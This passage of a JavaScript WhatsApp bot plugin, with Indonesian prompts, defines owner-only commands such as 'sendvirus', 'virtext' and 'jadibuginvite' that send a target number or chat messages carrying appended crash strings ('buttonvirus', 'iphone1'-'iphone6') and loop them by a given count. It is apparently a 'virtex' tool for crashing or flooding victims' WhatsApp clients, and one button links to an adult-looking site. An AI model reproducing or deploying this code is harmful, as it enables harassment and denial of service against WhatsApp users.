\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` ${text}  ${buttonkal}`,
footer: ` ${text} `,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `${text}`, url: 'www.xnxxhwmods.com'}}, 
{ quickReplyButton: { displayText: `CLICK BY  ${text} `, id: '🗡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${text} `, id: '🛡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${text} `, id: '🔧'}},
{ quickReplyButton: { displayText: `CLICK BY  ${text} `, id: '🪞'}}],
headerType: 5
}
conn.sendMessage(m.chat, message, { quoted:m })
}
}
break
//=================================================//
case 'jadibuginvite': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/elaina.png') }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${text} ${buttonkal}`,
"groupName": `MY NAME 🔥 ${text} ${buttonkal}`,
"caption": `🔥 ${text} ${buttonkal}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
conn.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
//=================================================//
case 'virtext8': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext9': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext10': {
if (!text) return m.reply(`masukan no target`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
let jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { image: ppnyauser,  caption: `ZYKO MD${buttonvirus}`}, { quoted:m })
}
}
break
case 'sendvirus2': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${iphone1}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus3': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${iphone2}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus4': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${iphone3}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus5': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${iphone4}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus6': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${iphone5}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus7': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${iphone6}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus8': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${buttonkal}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus9': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${buttonvirus}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus10': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${buttonvirus}`}, { quoted:m })
}
break
case 'sendvirus': {
if (!text) return m.reply(`masukan no target`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, { image: ppnyauser,  caption: `ZYKO MD${iphone}` }, { quoted:m })
}
break
//=================================================//
case 'jadipolling': {
if (!text) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ZYKO MD`)
{
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `Salam kenal saya ${text}`,
"options": [
{
"optionName": `Saya ${text}`
},
{
"optionName": `Dimari Kalau Ada ${text} Jangan lari`
}
],
"selectableOptionsCount": 2
}
}), { userJid: m.chat, quoted:m })
conn.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
      }
      break
    }
  }
}
handler.command = ['jadilokas', 'jadipolling', 'jaditroli', 'jadidocu',
'senddocu',
'senddocu2',
'senddocu5',
'senddocu4',
'senddocu3',
'senddocu2',
'sendtrol',
'sendtrol3',
'sendtrol4',
'sendtrol5',
'jadibugpayment',
'jadibugsw',
'virtext',
'virtext2',
'virtext3',
'virtext4',
'virtext5',
'virtext6',
'virtext7',
'virtext8',
'virtext9',
'virtext10',
'jadivirtext1',
'jadivirtext2',
'jadivirtext3',
'jadivirtext4',
'sendtrol2',
'jadivirtext5',
'jadivirtext6',
'jadivirtext7',
'jadivirtext8',
'jadivirtext9',
'jadivirtext10',
'sendvirus',
'sendvirus2',
'sendvirus3',
'sendvirus4',
'sendvirus5',
'sendvirus6',
'sendvirus7',
'sendvirus8',
'sendvirus9',
'sendvirus10',
'sendlokas',
'sendlokas2',
'sendlokas3',
'sendlokas4',
'sendlokas5',
'jadijago',
'jagoan',
'jagoan2',
'santet',
'santet2',
'santet3',
'santet4',
'santet5',
'🌹',
'🌷',
'🐲',
'🐉',
'🌵',
'🎄',
'🌲',
'🌳',
'🌱',
'🌿',
'🍀',
'☘️',
'🦖',
'🦕',
'👿',
'⚡',
'😈', 
'💥',
'🍂',
'🌪️',
'🔥',
'jadibuginvite',
'sendinvite',
'sendinvite2',
'sendinvite3',
'sendinvite4',
'sendinvite5',
'jadibugbutton']
handler.owner = true
export default handler 

function ucapan() {
  const time = moment.tz('Asia/Jakarta').format('HH')
  let res = "Kok Belum Tidur Kak? 🥱"
  if (time >= 4) {
    res = "Pagi Lord 🌄"
  }
  if (time >= 10) {
    res = "Siang Lord ☀️"
  }
  if (time >= 15) {
    res = "Sore Lord 🌇"
  }
  if (time >= 18) {
    res = "Malam Lord 🌙"
  }
  return res
}